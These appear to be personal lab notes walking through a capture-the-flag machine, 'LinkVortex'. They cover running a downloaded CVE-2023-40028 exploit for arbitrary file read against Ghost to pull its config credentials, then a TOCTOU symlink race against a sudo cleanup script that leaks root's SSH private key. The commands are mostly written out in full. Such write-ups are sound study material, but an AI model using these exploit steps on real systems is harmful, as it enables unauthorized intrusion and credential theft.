CVE-2023-40028

```
wget https://raw.githubusercontent.com/0xyassine/CVE-2023-40028/refs/heads/master/CVE-2023-40028.sh
```

After downloading it, we need to modify the script slightly to point to the correct endpoint. Instead of http://127.0.0.1 it should point to http://linkvortex.htb .

```
chmod +x CVE-2023-40028.sh
```

```
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

``` 
WELCOME TO THE CVE-2023-40028 SHELL 
file>
```

```
file> /var/lib/ghost/config.production.json
```

CREDENTIALS

---

PRIV ESC

![[Pasted image 20260318003238.png]]

![[Pasted image 20260318003250.png]]

The script takes a .png file as input, checks if it's a symbolic link, and inspects the link's target. If the target points to sensitive directories like /etc or /root , it unlinks the file; otherwise, it moves it to a quarantine folder ( /var/quarantined ). Once moved to quarantine and if the environment variable CHECK_CONTENT is set to true , it prints the content of the linked file. A race condition called TOCTOU (Time-of-Check to Time-of-Use) opens up here. After the symlink is moved to quarantine, we can quickly swap the link target to point to a sensitive file such as /etc/shadow or even a private key for root such as /root/.ssh/id_rsa . If we also set CHECK_CONTENT=true , the script will read the sensitive file, bypassing the initial check! Technically since this file is under the /opt/ghost directory we can assume that root and bob are using it to check the files under /content/images to be sure that no zip files are uploaded containing malicious symlinks. This means that we can use the same exploit as before, create a directory and the symlink file, then zip it and upload it. Let's first create the directory and PNG file with a symlink target that will pass the initial check, like /ok. This doesn't actually point to anything real, so it is considered a broken symlink, but we will change its target later, so it doesn't matter.

---

In Kali Attacker machine

```
mkdir -p exploit2/content/images/
```

```
ln -s /ok exploit2/content/images/key.png
```

```
zip -r -y exploit2.zip exploit2/
```

---


Then, we will upload the zip file again through the ghost website under Import Content in Settings > Labs . After it uploads, we can check that the file exists on the machine.

Check whether key.png exists in /opt/ghost/content/images

![[Pasted image 20260318003345.png]]

---

In the first bob terminal,

```
while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
```

IN 2nd bob terminal,

```
export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png
```

![[Pasted image 20260318003443.png]]

SSH key should be spat out

---

```
vim id_rsa
```

```
chmod 600 id_rsa
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh root@${ip} -i id_rsa`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
